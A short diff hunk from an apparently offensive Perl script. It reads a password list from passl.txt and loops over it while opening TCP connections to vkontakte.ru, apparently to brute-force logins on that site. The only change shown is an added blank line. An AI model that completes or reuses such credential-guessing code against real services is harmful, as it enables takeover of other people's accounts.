@@ -13,6 +13,7 @@ open (pass, '<passl.txt');
 close pass;
 chomp @pass;
 
+
 while (@pass[$i]){
 system("cls");
 $sock = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"vkontakte.ru",PeerPort=>"80");
